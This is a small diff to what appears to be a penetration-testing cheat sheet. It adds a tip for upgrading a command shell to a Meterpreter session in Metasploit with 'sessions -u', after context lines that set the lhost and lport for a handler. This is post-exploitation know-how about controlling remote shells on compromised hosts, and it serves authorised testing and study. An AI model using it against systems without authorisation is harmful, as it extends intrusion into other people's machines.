@@ -68,3 +68,9 @@ set lhost <your_ip>
 set lport <your_port>
 run
 ```
+
+Another easy way of upgrading a command shell to a Meterpreter shell is the following one:
+```bash
+# Exit from the shell session using Ctrl+Z
+sessions -u <session_id>
+```
